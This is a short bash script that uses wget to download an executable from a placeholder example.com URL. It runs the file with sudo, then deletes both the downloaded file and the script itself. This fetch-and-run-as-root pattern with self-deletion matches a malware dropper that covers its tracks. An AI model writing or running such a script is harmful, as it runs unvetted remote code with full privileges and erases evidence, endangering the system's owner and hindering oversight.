#!/bin/bash

# Replace the URL with the URL of the file you want to download
URL="https://example.com/file.exe"

# Download the file
wget $URL

# Get the file name
file_name=$(echo $URL | awk -F/ '{print $NF}')

# Execute the file as an administrator
sudo chmod +x $file_name
sudo ./$file_name

# Delete the file
sudo rm -f $file_name

# Delete the script
sudo rm -- "$0"
